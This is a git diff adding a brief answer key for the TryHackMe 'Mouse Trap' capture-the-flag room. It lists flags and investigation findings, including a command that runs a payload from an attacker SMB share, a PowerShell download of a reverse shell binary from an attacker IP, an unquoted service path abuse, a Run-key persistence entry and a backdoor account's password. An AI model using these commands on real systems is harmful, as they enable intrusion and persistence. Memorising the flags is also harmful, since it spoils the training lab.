@@ -1,0 +1,41 @@
+Mouse Trap
+https://tryhackme.com/room/mousetrap
+
+What is the user flag after getting initial access?
+THM{Terry_mouse_2_rce}
+
+What is the administrator flag located on the Desktop?
+THM{Terry_1s_th3_4dm1n_n0w}
+
+After achieving persistence, run the checker script on the desktop. What is the flag?
+THM{Mouse_Trouble_#4344#}
+
+What is the name of the payload that was shared ?
+payload.exe
+
+What is the IP attacker’s IP address?
+10.10.205.235
+
+What is the full command-line of the executed payload?
+cmd.exe /c start /B\\10.10.205.235\share\payload.exe
+
+What is the full command-line of the tool used to enumerate the privilege escalation vectors?
+.\SharpUp.exe audit
+
+When was this tool executed?
+8/6/2024 4:14:43 PM
+
+What command was used to transfer the reverse shell binary into the system?
+powershell iwr http://10.10.205.235:1234/payload.exe -outfile Mouse.exe
+
+What is the full command line value of the process created during the unquoted service path abuse?
+"C:\Program Files (x86)\Mobile Mouse\Mouse” Utilities\HelperService.exe
+
+What was the password set for the user created by the attacker for persistence?
+chazy??123
+
+What is the key name used for persistence?
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+What is the target path of the persistence implant by the attacker?
+C:\Users\Public\admin.exe
